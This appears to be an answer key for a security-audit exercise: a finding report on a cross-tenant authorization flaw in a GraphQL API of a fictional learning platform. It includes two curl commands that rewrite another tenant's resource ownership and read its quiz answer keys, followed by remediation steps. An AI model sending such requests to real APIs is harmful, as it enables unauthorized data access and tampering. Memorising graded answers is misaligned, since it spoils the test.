# Expected Response

## System
- Domain: Education / EdTech LMS
- System: LearnPath Assessment Platform
- Example ID: GQL-0116

## Priority Findings

### Finding 1: Nested LMS Resource Write Without Parent Authorization — Cross-Tenant Assessment Data (Pattern 1.7)
**Severity:** High
**Category:** BOLA / Nested Resources

**Summary:**
Per §5.0 (Pattern 1.7 — nested resources without parent authorization): The `updateResource` mutation accesses nested assessment resources without re-validating tenantId at each level. An attacker from `tenant-81f9` submitted `updateResource(id: "R-2116", input: {status: "approved", ownerId: "attacker-81f9a6b3"})` against an LMS resource belonging to `tenant-a6b3`. Parent-level authorization is bypassed, and child assessment items (quiz questions, answer keys) accessible via `getResourceWithChildren` are also not re-validated.

**Evidence from HAR:**
- Request: `POST https://api.learnpath-assessment.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-81f9`
- Mutation: `updateResource(id: "R-2116", input: {status: "approved", ownerId: "attacker-81f9a6b3"}) { resourceId status }`
- Response `200 OK`; `tenantId: "tenant-a6b3"`, `sensitiveField: "CONFIDENTIAL-81f9a6b3"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-81f9a6b3`

## Steps to Reproduce

### Step 1 — Nested LMS resource write (HAR)
```bash
curl -s -X POST https://api.learnpath-assessment.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-81f9" \
  -d '{"query": "mutation { updateResource(id: \"R-2116\", input: {status: \"approved\", ownerId: \"attacker-81f9a6b3\"}) { resourceId status } }"}'
```
**Vulnerable:** Assessment resource mutated cross-tenant. **Secure:** FORBIDDEN.

### Step 2 — Access nested child assessment items
```bash
curl -s -X POST https://api.learnpath-assessment.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-81f9" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2116\") { resourceId tenantId items { resourceId tenantId data { sensitiveField } } } }"}'
```
**Vulnerable:** Nested quiz items from `tenant-a6b3` exposed.

## Remediation
1. Resolver tenant guard on `updateResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Re-validate tenantId at each nested resource level.
3. Strip `ownerId` from `ResourceInput`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
